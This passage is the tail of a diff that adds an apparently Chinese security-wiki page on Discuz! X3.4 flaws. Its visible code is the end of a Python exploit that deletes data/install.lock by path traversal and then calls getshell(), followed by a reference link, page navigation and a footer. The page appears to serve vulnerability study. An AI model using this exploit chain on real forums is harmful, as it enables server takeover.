+        <span class="n">delete</span><span class="p">(</span><span class="n">form_hash</span><span class="p">,</span> <span class="s1">&#39;../../../data/install.lock&#39;</span><span class="p">)</span>
+        <span class="n">getshell</span><span class="p">()</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;failed&#39;</span><span class="p">)</span>
+</code></pre></div>
+
+<h2 id="_6">参考链接<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/7492">https://xz.aliyun.com/t/7492</a>#toc-7</p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Discuz%21%20X3.4%20%E5%89%8D%E5%8F%B0ssrf/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Discuz%21%20X3.4%20%E5%89%8D%E5%8F%B0ssrf/" class="btn btn-xs btn-link">
+        Discuz! X3.4 前台ssrf
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Discuz%21%20X3.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Discuz%21%20X3.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Discuz! X3.4 任意文件删除漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
